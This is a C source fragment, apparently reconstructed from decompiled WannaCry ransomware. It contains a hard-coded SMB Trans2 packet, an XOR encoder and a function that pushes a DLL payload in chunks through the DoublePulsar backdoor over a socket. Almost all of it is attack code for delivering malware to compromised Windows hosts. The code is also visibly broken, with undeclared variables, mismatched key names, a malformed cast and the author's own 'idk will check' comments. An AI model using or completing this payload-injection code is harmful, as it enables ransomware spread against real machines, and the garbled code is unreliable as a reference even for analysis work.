//Trans2 session setup EXEC(C8 or \x25\x89\x1a\x00) request found in Wannacry
unsigned char wannacry_Trans2_Request[] = 
"\x00\x00\x10\x4e\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x18\x07\xc0"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe"
"\x00\x08\x42\x00\x0f\x0c\x00\x00\x10\x01\x00\x00\x00\x00\x00\x00"
"\x00\x25\x89\x1a\x00\x00\x00\x0c\x00\x42\x00\x00\x10\x4e\x00\x01"
"\x00\x0e\x00\x0d\x10\x00";

int encodePacket(unsigned int xor_key, char *buf, int size)
{
	int i;
	char __xor_key[5];
	i = 0;
	*&__xor_key[1] = 0;
	*__xor_key = xor_key;
	if (size <= 0)
		return 0;
	do
	{
		*(i + buf) ^= __xor_key[i % 4];
		++i;
	} while ( i < size );
	return 0;
}


int iterations = TotalSizeOfPayload / 4096;
int remainder = TotalSizeOfPayload % 4096;
int v28;
int v14;
int v26;
int v27;

int v12;
int v13;
int v22 = 0;
int i;
int offset;
unsigned char signature[12]; //dunno why Wannacry lists this variable with 9

int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, unsigned int XorKey)
{
	if ( TotalSizeOfPayload / 4096 > 0 )
	    {
	      for ( i = 0; ; offset = i )
	      {
		*(_QWORD *)&signature = TotalSizeOfPayload;
		*(_QWORD *)&signature[4] = 4096;
		*(_DWORD *)&signature[8] = offset;
		encodePacket(xorkey, signature, 12);
		v29 = *(_QWORD *)v16;
		v30 = *(_DWORD *)&v16[8];
		qmemcpy(&v31, (char *)hMem + offset, 4096);
		if ( send(s, &buf, 4178, 0) == -1 )
			break;
		recv(s, &recvbuff, 4096, 0);
		if ( buf[34] != 82 )
		  break;
		v13 = __OFSUB__(v22 + 1, iterations);
		v12 = v22++ + 1 - iterations < 0;
		i += 4096;
		if ( !(v12 ^ v13) )
		  break;
	      }
	   }

	if ( remainder > 0 )
	    {
	      ImportantValue = htons(remainder + 78);
	      v28 = remainder + 13;
	      last_offset = iterations << 12;
	      v26 = remainder;
	      v27 = remainder;
	      *(_QWORD *)signature = TotalSizeOfPayload;
	      *(_QWORD *)signature[4] = remainder;
	      *(_DWORD *)&signature[8] = last_offset; //offset increase ???  idk will check
	      encodePacket(xorKey, signature, 12);
	      v30 = *(_DWORD *)&signature[8];
	      v29 = *(_QWORD *)signature;
	      qmemcpy(&v31, (char *)hMem + last_offset, remainder);
	      if ( send(s, &buf, remainder + 82, 0) != -1 )
		recv(s, &recvbuff, 4096, 0);
	    }
	
	GlobalFree(hMem);
}